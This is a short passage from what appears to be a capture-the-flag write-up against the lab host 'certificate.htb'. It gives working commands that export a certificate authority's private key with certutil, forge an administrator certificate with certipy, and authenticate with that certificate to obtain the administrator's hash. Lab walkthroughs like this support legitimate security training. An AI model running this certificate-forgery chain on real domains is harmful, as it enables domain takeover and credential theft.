Obtain the CA's private key:

```bash
certutil -exportpfx my Certificate-LTD-CA CA_key.pfx
```

![[Pasted image 20250604035729.png]]

Authenticate with the private key and embed the User Principal Name (UPN) into the forged certificate, making it look like it came from a legit user:

```bash
certipy forge -ca-pfx CA_key.pfx -upn 'administrator@certificate.htb'
```

Login with the cert and obtain the administrators hash:

```bash
certipy auth -pfx administrator_forged.pfx
```